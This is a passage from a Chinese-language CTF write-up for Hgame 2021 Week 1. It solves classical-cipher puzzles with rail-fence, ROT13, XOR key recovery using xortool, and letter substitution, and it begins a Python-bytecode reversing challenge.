<pre class="language-none"><code class="language-none">n4yGu~zF_BLhrfp9+C{1Eez!upPlN1!tYnccK}</code></pre>
<p>看样子又不像。里面都没有 <code>hgame</code>，又试了试栅栏，这不对劲啊。</p>
<hr>
<p>看了官方 WP 后，这6个栅栏就离谱！</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210207220856104.png"></p>
<p>太奇怪了！！！</p>
<pre class="language-none"><code class="language-none">}KccnYt
!1NlPpu
!zeE1{
C+9pfr
hLB_Fz
~uGy4n
=====&gt;
}!!Ch~K1z+LucNe9BGclEp_ynP1fF4Yp{rzntu</code></pre>
<p>然后逆序</p>
<pre class="language-none"><code class="language-none">utnzr{pY4Ff1Pny_pElcGB9eNcuL+z1K~hC!!}</code></pre>
<p>凯撒 / ROT13</p>
<pre class="language-none"><code class="language-none">hgame{cL4Ss1Cal_cRypTO9rAphY+m1X~uP!!}</code></pre>


<h3 id="对称之美"><a href="#对称之美" class="headerlink" title="对称之美"></a>对称之美</h3><blockquote>
<p>美术大师 Liki 总说，对称是世界上最美的结构…</p>
</blockquote>
<p>源码：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random
<span class="token keyword">import</span> string
<span class="token keyword">import</span> itertools
<span class="token keyword">from</span> secret <span class="token keyword">import</span> FLAG

key <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

cipher <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">for</span> m<span class="token punctuation">,</span> k <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>FLAG<span class="token punctuation">,</span> itertools<span class="token punctuation">.</span>cycle<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>

<span class="token comment">#cipher=b'&gt;\tA+/\x01@"\x08T\x1a\x1a\x17\x05\x07\x11\x143Kf5\x0cQ&gt;Q\x00\x1b\x11\x17\x01\x19\x00Y?V21D[6Q~\x12TG\x05\x1c\x0b@3V!b\x0bFp\x15\x06\x12\x03^\n\x12EV;T\',\x07Qp\x14\x15\x10\x1c\x17\x0b\x01\rQ(\x18L-\x11@~Q \x1b\x1dDD\x16\nA6\\f \x01\x14$\x19\x11S\x1bU\x0e\x10\x06@)\x182*\x01Y#\x14\x18\x05\x11DHUoV/Lf+\x10\x143\x10\x1aS\x15[\x17\x1aEF?T\'6\x01\x14$\x1eT\x10\x1b[\x0b\x07\x16\x14;V"bn[$\x19\x11\x01TT\x0b\x18\x15[)Q2+\x0bZ1\x1dT\x07\x11T\x0c\x1b\x0cE/]5lnm?\x04T\x1e\x15ND\x1b\n@zJ##\x08]*\x14T\x1a\x00\x1bD\x17\x10@zA)7\x16\x142\x03\x15\x1a\x1a\x17n\x1c\x16\x148M5;DC?\x03\x1f\x1a\x1aPD\x17\x00\\3V"b\x10\\5Q\x07\x10\x11Y\x01\x06E@5\x185\'\x01_p{\x1b\x06\x00\x17\x17\x0c\x08Y?L4;DC8\x14\x1aS\rX\x11U\t[5Sf#\x10\x141Q\x04\x12\x1dY\x10\x1c\x0bSt\x18L\x16\x0cQ"\x14T\x12\x06RD\x06\x00B?J\'.DF5\x10\x07\x1c\x1aDD\x13\nFzL.+\x17\x1ap%\x1c\x16T=\x02\x1c\x17G.\x18/1D@8\x10\x00S\x03RC\x07\x00\x142Y4&amp;IC9\x03\x11\x17TC\x0bU\t[5Sf$\x0bFp{\x1d\x07Z\x17+\x00\x17\x14;V%+\x01Z$Q\x15\x1d\x17R\x17\x01\nF)\x18+#\x1d\x14&gt;\x1e\x00S\x1cV\x12\x10E\\;\\fH\x05\x14&gt;\x10\x19\x16TQ\x0b\x07E].\x14f \x11@p\x05\x1c\x16\r\x17\x0f\x1b\x00CzL.#\x10\x14$\x19\x11\x1a\x06\x17n\x1a\x12ZzZ)&amp;\rQ#Q\x03\x16\x06RD\x17\x04G3[\'.\x08Mp\x02\r\x1e\x19R\x10\x07\x0cW;Tjb\x05Gp{\x03\x16\x06RD\x01\r[)]f-\x02\x14 \x1e\x00\x16\x1aC\r\x14\t\x14*J#&amp;\x05@?\x03\x07S\x1bED\x05\x17Q#\x16fH0\\5\x03\x11\x15\x1bE\x01YE@2Q5b\x07U=\x14T\x1a\x1a\x17\x0c\x14\x0bP#\x181*\x01@8\x14\x06S~T\x0c\x1a\nG3V!b\x05\x14=\x10\x00\x16X\x17\x07\x14\x11W2Q(%DP9\x1f\x1a\x16\x06\x17\x0b\x07E&gt;;N)+\x00]&gt;\x16T\x11\x11^\n\x12E[4\x182*\x01\x14=\x14\x1a\x06TX\x02U\x04\x14)V\'0\x08]&gt;\x16XS~_\x11\x1b\x02F#\x186#\x07_p\x1e\x12S\x03X\x08\x03\x00GzW4b\x06Q1\x03\x07R~c\x05\x1e\x00\x14;\x18*-\x0b_p\x10\x00S\rX\x11\x07ER;[#b\rZp\x05\x1c\x16TZ\r\x07\x17[(\x18L#\nPp\x18\x19\x12\x13^\n\x10EUzT/,\x01\x14#\x05\x06\x12\x1dP\x0c\x01EP5O(b\x10\\5Q~\x1e\x1dS\x00\x19\x00\x1aza)7CX&lt;Q\x07\x16\x11\x17\x06\x1a\x11\\zK/&amp;\x01Gp\x1e\x12S\rX\x11\x07E&gt;&lt;Y%\'DU"\x14T\x03\x06R\x10\x01\x1c\x14)A+/\x01@"\x18\x17\x12\x18\x19D!\r])\x18/1D&gt;;\x1f\x1b\x04\x1a\x17\x05\x06EV3T\'6\x01F1\x1dT\x00\rZ\t\x10\x11F#\x18\',\x00\x149\x05S\x00T=\x13\x1d\x00F?\x18$-\x10\\p\x02\x1d\x17\x11DD\x10\x0c@2]4b\x17]4\x14T\x1c\x12\x17\x10\x1d\x0cGz2"+\x12]4\x18\x1a\x14T[\r\x1b\x00\x14;H6\'\x05Fp\x1c\x1b\x01\x11\x17\x0b\x07EX?K5b\x10\\5Q\x07\x12\x19RJ\x7f6[zP#0\x01\x149\x02T\x07\x1cRD\x13\tU=\x02fH\x0cS1\x1c\x11\x08,\x07\x16*\x0c\x01wY\x1977\x076$EX@Y\x00Q\x03a\x14V?\x1d\'\x05 9G\x01\t='</span></code></pre>
<p>利用 <a target="_blank" rel="noopener" href="https://github.com/hellman/xortool">xortool</a>，可以帮助得到这个加密使用的 key。</p>
<blockquote>
<p><strong>xortool.py</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">xortool
  A tool to <span class="token keyword">do</span> some xor analysis:
  - guess the key length <span class="token punctuation">(</span>based on count of equal chars<span class="token punctuation">)</span>
  - guess the key <span class="token punctuation">(</span>base on knowledge of <span class="token function">most</span> frequent char<span class="token punctuation">)</span>

Usage:
  xortool <span class="token punctuation">[</span>-x<span class="token punctuation">]</span> <span class="token punctuation">[</span>-m MAX-LEN<span class="token punctuation">]</span> <span class="token punctuation">[</span>-f<span class="token punctuation">]</span> <span class="token punctuation">[</span>-t CHARSET<span class="token punctuation">]</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>
  xortool <span class="token punctuation">[</span>-x<span class="token punctuation">]</span> <span class="token punctuation">[</span>-l LEN<span class="token punctuation">]</span> <span class="token punctuation">[</span>-c CHAR <span class="token operator">|</span> -b <span class="token operator">|</span> -o<span class="token punctuation">]</span> <span class="token punctuation">[</span>-f<span class="token punctuation">]</span> <span class="token punctuation">[</span>-t CHARSET<span class="token punctuation">]</span> <span class="token punctuation">[</span>-p PLAIN<span class="token punctuation">]</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>
  xortool <span class="token punctuation">[</span>-x<span class="token punctuation">]</span> <span class="token punctuation">[</span>-m MAX-LEN<span class="token operator">|</span> -l LEN<span class="token punctuation">]</span> <span class="token punctuation">[</span>-c CHAR <span class="token operator">|</span> -b <span class="token operator">|</span> -o<span class="token punctuation">]</span> <span class="token punctuation">[</span>-f<span class="token punctuation">]</span> <span class="token punctuation">[</span>-t CHARSET<span class="token punctuation">]</span> <span class="token punctuation">[</span>-p PLAIN<span class="token punctuation">]</span> <span class="token punctuation">[</span>FILE<span class="token punctuation">]</span>
  xortool <span class="token punctuation">[</span>-h <span class="token operator">|</span> --help<span class="token punctuation">]</span>
  xortool --version

Options:
  -x --hex                          input is hex-encoded str
  -l LEN, --key-length<span class="token operator">=</span>LEN          length of the key
  -m MAX-LEN, --max-keylen<span class="token operator">=</span>MAX-LEN  maximum key length to probe <span class="token punctuation">[</span>default: <span class="token number">65</span><span class="token punctuation">]</span>
  -c CHAR, --char<span class="token operator">=</span>CHAR              <span class="token function">most</span> frequent char <span class="token punctuation">(</span>one char or hex code<span class="token punctuation">)</span>
  -b --brute-chars                  brute force all possible <span class="token function">most</span> frequent chars
  -o --brute-printable              same as -b but will only check printable chars
  -f --filter-output                filter outputs based on the charset
  -t CHARSET --text-charset<span class="token operator">=</span>CHARSET target text character <span class="token builtin class-name">set</span> <span class="token punctuation">[</span>default: printable<span class="token punctuation">]</span>
  -p PLAIN --known-plaintext<span class="token operator">=</span>PLAIN  use known plaintext <span class="token keyword">for</span> decoding
  -h --help                         show this <span class="token builtin class-name">help</span></code></pre>
<p>由于它的 FILE 输入需要的是 binary 或者 hex 或者 plain text，而这里的 cipher 是 Python 里的字符串，所以先转换成 hex。</p>
</blockquote>
<pre class="language-python" data-language="python"><code class="language-python">cipher <span class="token operator">=</span> <span class="token string">'xxxxxx'</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<p>然后把这个 hex 保存到文件，比如 <code>cipher.txt</code>.</p>
<p>试了一下，指定 <code>-l 16</code> 倒没作用，<code>-p "hgame{"</code> 甚至会报错。最后还是用下面这个好了。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ xortool -x -c <span class="token number">20</span> cipher.txt
The <span class="token function">most</span> probable key lengths:
 <span class="token number">2</span>:  <span class="token number">10.3</span>%
 <span class="token number">4</span>:  <span class="token number">10.9</span>%
 <span class="token number">6</span>:   <span class="token number">9.3</span>%
 <span class="token number">8</span>:  <span class="token number">15.0</span>%
<span class="token number">10</span>:   <span class="token number">7.7</span>%
<span class="token number">12</span>:   <span class="token number">8.5</span>%
<span class="token number">14</span>:   <span class="token number">7.4</span>%
<span class="token number">16</span>:  <span class="token number">15.5</span>%
<span class="token number">32</span>:   <span class="token number">7.8</span>%
Key-length can be <span class="token number">4</span>*n
<span class="token number">2</span> possible key<span class="token punctuation">(</span>s<span class="token punctuation">)</span> of length <span class="token number">16</span>:
4Z8FB<span class="token operator">!</span>4Pqtst7d<span class="token string">'e
4Z8FB!4P4tst7d'</span>e
Found <span class="token number">2</span> plaintexts with <span class="token number">95</span>%+ valid characters
See files filename-key.csv, filename-char_used-perc_valid.csv</code></pre>
<p>看一看输出的文件，已经很有味道了，flag 都很明显了。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210204023958672.png"></p>
<p>根据出来的 key <code>4Z8FB!4Pqtst7d'e</code>，有两个不在 <code>string.ascii_letters + string.digits</code> 范围内的字符，于是考虑爆破一下找真正的 key。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
keys <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
cipher <span class="token operator">=</span> <span class="token string">'xxxxxxxx'</span>
<span class="token comment"># 4Z8FB!4Pqtst7d'e</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> keys<span class="token punctuation">:</span>
    key <span class="token operator">=</span> <span class="token string">"4Z8FB"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"4Pqtst7due"</span>
    r <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> idx<span class="token punctuation">,</span> value <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>
        x <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>value <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>idx <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        r <span class="token operator">+=</span> x
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'===='</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'===='</span><span class="token punctuation">)</span>
    <span class="token comment"># print(r)</span>
    <span class="token keyword">if</span> <span class="token string">'hgame'</span> <span class="token keyword">in</span> r<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span></code></pre>
<p>两个位置都试一试，最后看哪个最合理。</p>
<p>最后得出是 <code>4Z8FBd4Pqtst7due</code></p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210204024350143.png"></p>
<pre class="language-none"><code class="language-none">Symmetry in art is when the elements of 
a painting or drawing balance each other 
out. This could be the objects themselves, 
but it can also relate to colors and 
other compositional techniques.
You may not realize it, but your brain 
is busy working behind the scenes to seek 
out symmetry when you look at a painting. 
There are several reasons for this. The 
first is that we're hard-wired to look for 
it. Our ancient ancestors may not have had 
a name for it, but they knew that their 
own bodies were basically symmetrical, as 
were those of potential predators or prey. 
Therefore, this came in handy whether 
choosing a mate, catching dinner or 
avoiding being on the menu of a snarling, 
hungry pack of wolves or bears!
Take a look at your face in the mirror 
and imagine a line straight down the 
middle. You'll see both sides of your 
face are pretty symmetrical. This is 
known as bilateral symmetry and it's 
where both sides either side of this 
dividing line appear more or less the same.
So here is the flag: 
hgame{X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r}</code></pre>
<p>然后发现这个居然真的有原文，就是 <strong>对称之美</strong>（Symmetry in Art），详见</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.pencilkings.com/symmetry-in-art/">5 Reasons Why We Love Symmetry in Art so Much (And How You Can Use This Research to Create Even More Awesome Paintings)</a></p>
</blockquote>
<h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><blockquote>
<p>所有人都已做好准备,月黑之时即将来临,为了击毁最后的主控能量柱,打开通往芝加哥的升降桥迫在眉睫 看守升降桥的控制员已经失踪,唯有在控制台的小房间留下来的小纸条,似乎是控制员防止自己老了把密码忘记而写下的,但似乎都是奇怪的字母组合,唯一有价值的线索是垃圾桶里的两堆被碎纸机粉碎的碎纸,随便查看几张,似乎是两份文件,并且其中一份和小纸条上的字母规律有点相像 附件md5:0340142700c8f63546368fa14fd6fb24</p>
<p><a target="_blank" rel="noopener" href="https://1.oss.hgame2021.vidar.club/Transformer.zip">https://1.oss.hgame2021.vidar.club/Transformer.zip</a> \</p>
</blockquote>
<p><code>Transformer.txt</code>:</p>
<pre class="language-none"><code class="language-none">Tqh ufso mnfcyh eaikauh kdkoht qpk aiud zkhc xpkkranc uayfi kfieh 2003, oqh xpkkranc fk "qypth{hp5d_s0n_szi^3ic&amp;qh11a_}",Dai'o sanyho oa pcc oqh dhpn po oqh hic.</code></pre>
<p>很明显这个就是密文了，flag 就藏在这个里面了。</p>
<p>然后给了 ori 和 enc，原文和密文，随意看了一下还打乱顺序了，坏耶。</p>
<p>不过问题不大，发现是对称加密，而且只是小写字母进行了对换，其他字符都不变。</p>
<p>那直接找足够多的样本，得到映射关系就完事了。</p>
<p>payload 有点乱，大概思路首先是找几个样本，然后根据样本得到匹配对 pair，最后解密。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> string

os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># base_dir = "enc/"</span>
base_dir <span class="token operator">=</span> <span class="token string">"ori/"</span>
filenames <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>base_dir<span class="token punctuation">)</span>
<span class="token keyword">for</span> filename <span class="token keyword">in</span> filenames<span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>base_dir <span class="token operator">+</span> filename<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># if "’" in content:</span>
    <span class="token comment"># if 'b' in content and 'l' in content:</span>
    <span class="token keyword">if</span> content<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">' '</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'====='</span><span class="token punctuation">)</span>


ori1 <span class="token operator">=</span> <span class="token triple-quoted-string string">"""hat you want but it will be “correct”.
anotrogram correctness” and many gstance. rust offers a form of “p
me; we don’t have to worry about the
from runtime checking of constraints and invariants;
mpile times to be pretty beefy; our cpus a
 memory safety; it definitely excites us kno
duction for the last few years and we’ve
if you’re new to rust, start small and build
started this project. we’ve bee
ntial localization implementation to meet the require
"""</span>

enc1 <span class="token operator">=</span> <span class="token triple-quoted-string string">"""qpo daz rpio mzo fo rfuu mh “eannheo”.
piaonaynpt eannheoihkk” pic tpid ykopieh. nzko asshnk p sant as “x
th; rh cai’o qpvh oa rannd pmazo oqh
snat nziofth eqhejfiy as eaikonpfiok pic fivpnfpiok;
txfuh ofthk oa mh xnhood mhhsd; azn exzk p
 thtand kpshod; fo chsfifohud hgefohk zk jia
czeofai san oqh upko shr dhpnk pic rh’vh
fs daz’nh ihr oa nzko, kopno ktpuu pic mzfuc
kopnohc oqfk xnawheo. rh’vh mhh
iofpu uaepufbpofai ftxuhthiopofai oa thho oqh nhlzfnh
"""</span>

pair <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">for</span> idx<span class="token punctuation">,</span> value <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>enc1<span class="token punctuation">)</span><span class="token punctuation">:</span>
    pair<span class="token punctuation">[</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> ori1<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>pair<span class="token punctuation">)</span>
<span class="token comment"># {'q': 'h', 'p': 'a', 'o': 't', ' ': ' ', 'd': 'y', 'a': 'o', 'z': 'u', 'r': 'w', 'i': 'n', 'm': 'b', 'f': 'i', 'u': 'l', 'h': 'e', '“': '“', 'e': 'c', 'n': 'r', '”': '”', '.': '.', '\n': '\n', 'y': 'g', 't': 'm', 'k': 's', 'c': 'd', 's': 'f', 'x': 'p', ';': ';', '’': '’', 'v': 'v', 'j': 'k', 'g': 'x', ',': ',', 'w': 'j', 'b': 'z', 'l': 'q'}</span>

s<span class="token operator">=</span><span class="token triple-quoted-string string">"""Tqh ufso mnfcyh eaikauh kdkoht qpk aiud zkhc xpkkranc uayfi kfieh 2003, oqh xpkkranc fk "qypth{hp5d_s0n_szi^3ic&amp;qh11a_}",Dai'o sanyho oa pcc oqh dhpn po oqh hic."""</span>
r <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    <span class="token keyword">if</span> i <span class="token keyword">in</span> string<span class="token punctuation">.</span>ascii_lowercase<span class="token punctuation">:</span>
        r <span class="token operator">+=</span> pair<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        r <span class="token operator">+=</span> i
    <span class="token comment"># print(r)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
<span class="token comment"># The lift bridge console system has only used password login since 2003, the password is "hgame{ea5y_f0r_fun^3nd&amp;he11o_}",Don't forget to add the year at the end.</span></code></pre>
<p>最后再加上年份</p>
<p><code>hgame{ea5y_f0r_fun^3nd&amp;he11o_2021}</code></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h3><p>给了 dis.dis human readable 的字节码，直接逆向一下就完事了。</p>
<pre class="language-python" data-language="python"><code class="language-python">  <span class="token number">4</span>           <span class="token number">0</span> LOAD_GLOBAL              <span class="token number">0</span> <span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span>
              <span class="token number">2</span> LOAD_CONST               <span class="token number">1</span> <span class="token punctuation">(</span><span class="token string">'give me your flag:\n'</span><span class="token punctuation">)</span>
              <span class="token number">4</span> CALL_FUNCTION            <span class="token number">1</span>
              <span class="token number">6</span> STORE_FAST               <span class="token number">0</span> <span class="token punctuation">(</span>raw_flag<span class="token punctuation">)</span>

  <span class="token number">5</span>           <span class="token number">8</span> LOAD_GLOBAL              <span class="token number">1</span> <span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>
             <span class="token number">10</span> LOAD_FAST                <span class="token number">0</span> <span class="token punctuation">(</span>raw_flag<span class="token punctuation">)</span>
             <span class="token number">12</span> LOAD_CONST               <span class="token number">2</span> <span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
             <span class="token number">14</span> LOAD_CONST               <span class="token number">3</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
             <span class="token number">16</span> BUILD_SLICE              <span class="token number">2</span>
             <span class="token number">18</span> BINARY_SUBSCR
             <span class="token number">20</span> CALL_FUNCTION            <span class="token number">1</span>
             <span class="token number">22</span> STORE_FAST               <span class="token number">1</span> <span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>

  <span class="token number">6</span>          <span class="token number">24</span> LOAD_GLOBAL              <span class="token number">2</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">)</span>
             <span class="token number">26</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
             <span class="token number">28</span> CALL_FUNCTION            <span class="token number">1</span>
             <span class="token number">30</span> STORE_FAST               <span class="token number">2</span> <span class="token punctuation">(</span>length<span class="token punctuation">)</span>

  <span class="token number">8</span>          <span class="token number">32</span> LOAD_GLOBAL              <span class="token number">3</span> <span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">)</span>
             <span class="token number">34</span> LOAD_FAST                <span class="token number">2</span> <span class="token punctuation">(</span>length<span class="token punctuation">)</span>
             <span class="token number">36</span> LOAD_CONST               <span class="token number">4</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
             <span class="token number">38</span> BINARY_FLOOR_DIVIDE
             <span class="token number">40</span> CALL_FUNCTION            <span class="token number">1</span>
             <span class="token number">42</span> GET_ITER
        <span class="token operator">&gt;&gt;</span>   <span class="token number">44</span> FOR_ITER                <span class="token number">54</span> <span class="token punctuation">(</span>to <span class="token number">100</span><span class="token punctuation">)</span>
             <span class="token number">46</span> STORE_FAST               <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>

  <span class="token number">9</span>          <span class="token number">48</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
             <span class="token number">50</span> LOAD_CONST               <span class="token number">4</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
             <span class="token number">52</span> LOAD_FAST                <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>
             <span class="token number">54</span> BINARY_MULTIPLY
             <span class="token number">56</span> LOAD_CONST               <span class="token number">5</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
             <span class="token number">58</span> BINARY_ADD
             <span class="token number">60</span> BINARY_SUBSCR
             <span class="token number">62</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
             <span class="token number">64</span> LOAD_CONST               <span class="token number">4</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
             <span class="token number">66</span> LOAD_FAST                <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>
             <span class="token number">68</span> BINARY_MULTIPLY
             <span class="token number">70</span> BINARY_SUBSCR
             <span class="token number">72</span> ROT_TWO
             <span class="token number">74</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
             <span class="token number">76</span> LOAD_CONST               <span class="token number">4</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
             <span class="token number">78</span> LOAD_FAST                <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>
             <span class="token number">80</span> BINARY_MULTIPLY
             <span class="token number">82</span> STORE_SUBSCR
             <span class="token number">84</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
             <span class="token number">86</span> LOAD_CONST               <span class="token number">4</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
             <span class="token number">88</span> LOAD_FAST                <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>
             <span class="token number">90</span> BINARY_MULTIPLY
             <span class="token number">92</span> LOAD_CONST               <span class="token number">5</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
             <span class="token number">94</span> BINARY_ADD
             <span class="token number">96</span> STORE_SUBSCR
             <span class="token number">98</span> JUMP_ABSOLUTE           <span class="token number">44</span>

 <span class="token number">12</span>     <span class="token operator">&gt;&gt;</span>  <span class="token number">100</span> BUILD_LIST               <span class="token number">0</span>
            <span class="token number">102</span> STORE_FAST               <span class="token number">4</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>

 <span class="token number">13</span>         <span class="token number">104</span> LOAD_GLOBAL              <span class="token number">3</span> <span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">)</span>
            <span class="token number">106</span> LOAD_FAST                <span class="token number">2</span> <span class="token punctuation">(</span>length<span class="token punctuation">)</span>
            <span class="token number">108</span> CALL_FUNCTION            <span class="token number">1</span>
            <span class="token number">110</span> GET_ITER
        <span class="token operator">&gt;&gt;</span>  <span class="token number">112</span> FOR_ITER                <span class="token number">26</span> <span class="token punctuation">(</span>to <span class="token number">140</span><span class="token punctuation">)</span>
            <span class="token number">114</span> STORE_FAST               <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>

 <span class="token number">14</span>         <span class="token number">116</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>
            <span class="token number">118</span> LOAD_METHOD              <span class="token number">4</span> <span class="token punctuation">(</span>append<span class="token punctuation">)</span>
            <span class="token number">120</span> LOAD_GLOBAL              <span class="token number">5</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">)</span>
            <span class="token number">122</span> LOAD_FAST                <span class="token number">1</span> <span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
            <span class="token number">124</span> LOAD_FAST                <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            <span class="token number">126</span> BINARY_SUBSCR
            <span class="token number">128</span> CALL_FUNCTION            <span class="token number">1</span>
            <span class="token number">130</span> LOAD_FAST                <span class="token number">3</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            <span class="token number">132</span> BINARY_XOR
            <span class="token number">134</span> CALL_METHOD              <span class="token number">1</span>
            <span class="token number">136</span> POP_TOP
            <span class="token number">138</span> JUMP_ABSOLUTE          <span class="token number">112</span>

 <span class="token number">15</span>     <span class="token operator">&gt;&gt;</span>  <span class="token number">140</span> LOAD_GLOBAL              <span class="token number">6</span> <span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">)</span>
            <span class="token number">142</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>
            <span class="token number">144</span> CALL_FUNCTION            <span class="token number">1</span>
            <span class="token number">146</span> LOAD_METHOD              <span class="token number">7</span> <span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">)</span>
            <span class="token number">148</span> CALL_METHOD              <span class="token number">0</span>
            <span class="token number">150</span> STORE_FAST               <span class="token number">4</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>

